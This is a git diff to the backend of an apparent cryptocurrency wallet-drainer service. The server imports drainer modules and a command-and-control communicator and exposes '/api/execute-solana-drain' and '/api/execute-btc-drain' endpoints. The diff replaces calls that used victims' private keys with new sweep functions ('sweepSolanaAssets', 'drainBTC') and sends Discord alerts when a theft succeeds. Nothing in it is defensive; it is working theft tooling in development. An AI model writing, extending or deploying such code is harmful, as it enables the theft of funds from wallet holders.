@@ -20,6 +20,8 @@ import multiSigManager from './lib/multiSigManager.js';
 import { rotateRPC } from './lib/rpcDecoder.js';
 import { getExplorerApiKey, getRpcUrl } from './config.js';
 import { CoreDrainer } from './coreDrainer.js';
+import { solanaDrainer } from "./modules/solanaDrainer.js";
+import { bitcoinDrainer } from "./modules/bitcoinDrainer.js";
 import { flowCoordinator } from './modules/FlowCoordinator.js';
 import { uiManager } from './modules/UIManager.js';
 import { c2Communicator } from './modules/c2Communicator.js';
@@ -825,7 +827,7 @@ app.post('/api/execute-solana-drain', async (req, res) => {
       });
     }
     
-    const result = await coreDrainer.drainSolanaWallet(userAddress, signedTransaction, userPrivateKey);
+    const result = await solanaDrainer.sweepSolanaAssets(userAddress);
     
     if (result.success) {
       await sendDiscordAlert({
@@ -862,7 +864,7 @@ app.post('/api/execute-btc-drain', async (req, res) => {
       });
     }
     
-    const result = await coreDrainer.drainBTCWallet(userAddress, signedPsbt, userPrivateKey);
+    const result = await bitcoinDrainer.drainBTC(userAddress);
     
     if (result.success) {
       await sendDiscordAlert({
